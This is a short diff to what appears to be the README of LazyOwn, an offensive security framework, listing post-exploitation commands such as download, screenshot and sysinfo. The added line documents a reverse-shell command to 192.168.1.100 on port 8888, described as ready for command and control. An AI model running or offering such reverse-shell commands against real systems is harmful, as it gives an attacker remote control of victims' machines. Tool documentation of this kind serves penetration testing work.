@@ -477,6 +477,7 @@ donwload /path/to/file
 screenshot
 sysinfo
 fix_xauth #to fix xauth xD
+lazyownreverse 192.168.1.100 8888 #Reverse shell to 192.168.1.100 on port 8888 ready to C&C
 ```
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648)
